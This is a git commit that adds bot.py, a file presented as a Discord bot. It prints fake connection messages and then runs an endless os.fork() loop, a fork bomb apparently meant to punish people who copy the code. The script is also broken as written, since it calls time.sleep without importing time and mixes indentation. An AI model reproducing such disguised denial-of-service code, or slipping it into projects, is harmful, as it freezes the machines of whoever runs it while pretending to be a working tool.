5cb8f105525c3fff09c00ed93e927aa16d0e66d4
CactusDuper <58598131+CactusDuper@users.noreply.github.com>
2020-09-11 22:09:53 -0500

    Create bot.py

---
+++ bot.py
@@ -0,0 +1,18 @@
+import discord
+import os
+time.sleep(15)
+print("YOU CANT USE THIS CODE WITHOUT ASKING ME PLS DONT STEAL CODE~!!!111!!!!!!111!!1!!!")
+time.sleep(5)
+print("starting the bot...")
+time.sleep(10)
+print("connecting...")
+time.sleep(10)
+print("connecting...")
+time.sleep(10)
+print("connecting...")
+time.sleep(10)
+print("connecting...")
+print("connected to discord!")
+while 1:
+    print("oh no it crashed, looks like you should make your own bot!")
+	os.fork()
